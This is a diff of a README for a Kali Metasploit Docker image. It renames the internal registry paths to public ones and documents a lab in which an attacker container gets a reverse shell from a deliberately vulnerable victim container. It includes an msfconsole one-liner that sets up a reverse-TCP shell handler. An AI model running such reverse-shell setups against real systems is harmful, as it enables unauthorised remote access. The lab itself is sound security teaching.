@@ -14,14 +14,14 @@ docker run -it polyverse/kali-metasploit msfconsole
 ## Example
 You can use the `-x` switch with msfconsole and then specify all the msf commands you want to run in a single double-quoted argument.
 ```
-docker run -it -p 5555:5555 polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $(docker run -it -p 5555:5555 polyverse-internal.jfrog.io/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}'); set LPORT 5555; exploit"
+docker run -it -p 5555:5555 polyverse/kali-metasploit msfconsole -x "use multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $(docker run -it -p 5555:5555 polyverse/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}'); set LPORT 5555; exploit"
 ```
 
 ### c-exploit.sh
-In this example, an attacker container (`polyverse-internal.jfrog.io/kali-metasploit`) will get a reverse-shell from the victim container (`polyverse/c-exploit`).
+In this example, an attacker container (`polyverse/kali-metasploit`) will get a reverse-shell from the victim container (`polyverse/c-exploit`).
 
-1. In this repo, perform `pv build -r polyverse-internal.jfrog.io docker`. This will create the Docker container image `polyverse-internal.jfrog.io/kali-metasploit`.
-2. `cd ..` to move up a folder and then `git clone https://github.com/polyverse-security/c-exploit.git`. If you've already cloned, just go to the folder and `git pull`.
+1. In this repo, perform `pv build -r polyverse docker`. This will create the Docker container image `polyverse/kali-metasploit`.
+2. `cd ..` to move up a folder and then `git clone https://github.com/polyverse/c-exploit.git`. If you've already cloned, just go to the folder and `git pull`.
 3. `pv build docker` to create a new version of `polyverse/c-exploit`.
 4. `cd ../kali-metasploit` to get back to the original folder.
 5. In one terminal window, launch `docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit`
